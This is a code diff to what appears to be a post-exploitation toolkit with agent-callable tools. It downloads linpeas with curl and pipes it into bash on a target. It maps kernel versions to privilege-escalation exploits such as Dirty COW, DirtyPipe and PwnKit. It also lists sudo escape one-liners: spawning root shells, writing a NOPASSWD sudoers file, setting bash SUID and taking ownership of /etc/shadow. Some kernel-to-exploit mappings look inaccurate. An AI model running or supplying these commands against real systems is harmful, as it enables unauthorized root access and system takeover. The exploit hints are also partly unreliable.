@@ -18,16 +18,29 @@ async def _run_kali(cmd: str, timeout: float = 300.0) -> dict[str, Any]:
 # ── linpeas / winpeas via session ────────────────────────────────────────────
 
 
+_LINPEAS_LOCAL_PATHS = [
+    "/usr/share/peass-ng/linpeas.sh",
+    "/usr/share/peass/linpeas.sh",
+    "/opt/linpeas.sh",
+    "/opt/PEASS-ng/linpeas.sh",
+]
+
+
 @registry.tool(
     name="post_linpeas_run",
     description=(
         "Download + run linpeas.sh on target (via session_exec proxy command). Returns top findings only. "
-        "`exec_cmd_template` should contain {} where the command goes (e.g. SSH user@host 'bash -c ...')."
+        "`exec_cmd_template` should contain {} where the command goes (e.g. SSH user@host 'bash -c ...'). "
+        "Tries local Kali copy first (/usr/share/peass-ng/linpeas.sh), falls back to remote download."
     ),
     category="post",
 )
 async def post_linpeas_run(exec_cmd_template: str, linpeas_url: str = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh") -> dict[str, Any]:
-    inner = f"curl -ks {shlex.quote(linpeas_url)} | bash 2>&1 | tail -c 8000"
+    # Build the inner command: try local copy on Kali first, fallback to remote download
+    local_check = " || ".join(f"[ -f {p} ] && cat {p}" for p in _LINPEAS_LOCAL_PATHS)
+    inner = (
+        f"( {local_check} || curl -ks {shlex.quote(linpeas_url)} ) | bash 2>&1 | tail -c 8000"
+    )
     if "{}" in exec_cmd_template:
         cmd = exec_cmd_template.replace("{}", inner)
     else:
@@ -97,9 +110,16 @@ async def post_enum_system(exec_cmd_template: str, os: str = "linux") -> dict[st
 
 KERNEL_HINTS: list[dict[str, Any]] = [
     {"pattern": "2.6.32", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
+    {"pattern": "2.6.39", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
     {"pattern": "3.13", "candidate": "OverlayFS (CVE-2015-1328)", "edb": "37292"},
+    {"pattern": "3.14", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
     {"pattern": "4.4.0", "candidate": "DCCP double-free (CVE-2017-6074)", "edb": "41458"},
-    {"pattern": "5.8.", "candidate": "PwnKit (CVE-2021-4034)", "edb": "50689"},
+    {"pattern": "4.15.", "candidate": "Dirty COW (CVE-2016-5195) / OverlayFS", "edb": "40847"},
+    {"pattern": "5.4.", "candidate": "DirtyPipe if 5.4.x-5.8: CVE-2022-0847", "edb": "50808"},
+    {"pattern": "5.8.", "candidate": "DirtyPipe (CVE-2022-0847) / PwnKit (CVE-2021-4034)", "edb": "50808"},
+    {"pattern": "5.10.", "candidate": "DirtyPipe (CVE-2022-0847) — check if <5.10.102", "edb": "50808"},
+    {"pattern": "5.15.", "candidate": "PwnKit (CVE-2021-4034) via pkexec", "edb": "50689"},
+    {"pattern": "5.16.", "candidate": "PwnKit (CVE-2021-4034) via pkexec", "edb": "50689"},
 ]
 
 
@@ -115,15 +135,40 @@ async def post_privesc_kernel(kernel_version: str) -> dict[str, Any]:
 
 SUDO_GTFOBINS = {
     "vim": "sudo vim -c ':!/bin/sh'",
+    "vi": "sudo vi -c ':!/bin/sh'",
+    "nano": "sudo nano  # ^R^X then: reset; sh 1>&0 2>&0",
     "less": "sudo less /etc/hostname  # then !/bin/sh",
+    "more": "sudo more /etc/hostname  # then !/bin/sh",
+    "man": "sudo man man  # then !/bin/sh",
     "find": "sudo find . -exec /bin/sh \\;",
     "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
     "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
     "python3": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
     "perl": "sudo perl -e 'exec \"/bin/sh\";'",
+    "ruby": "sudo ruby -e 'exec \"/bin/sh\"'",
+    "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'",
+    "php": "sudo php -r 'system(\"/bin/sh\");'",
+    "node": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
+    "bash": "sudo bash",
+    "sh": "sudo sh",
+    "env": "sudo env /bin/sh",
     "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
-    "wget": "(no direct shell — abuse via --post-file with sensitive paths)",
+    "wget": "(read-only — no direct shell; abuse via --post-file or to overwrite authorized_keys)",
+    "curl": "(read-only — no direct shell; abuse to write files via -o)",
     "rsync": "sudo rsync -e 'sh -c \"sh -i 0<&2 1>&2\"' 127.0.0.1:/dev/null /dev/null",
+    "nmap": "echo 'os.execute(\"/bin/sh\")' > /tmp/n.nse && sudo nmap --script=/tmp/n.nse",
+    "git": "sudo git -p help config  # then !/bin/sh",
+    "ftp": "sudo ftp  # then !/bin/sh",
+    "tee": "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/evil",
+    "cp": "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p",
+    "dd": "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo dd of=/etc/sudoers.d/evil",
+    "chmod": "sudo chmod +s /bin/bash && /bin/bash -p",
+    "chown": "sudo chown $(id -un):$(id -gn) /etc/shadow",
+    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "zip": "TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T --unzip-command='sh -c /bin/sh'",
+    "pkexec": "sudo pkexec /bin/sh  # also test CVE-2021-4034 PwnKit",
+    "socat": "sudo socat stdin exec:/bin/sh",
+    "strace": "sudo strace -o /dev/null /bin/sh",
 }
 
 
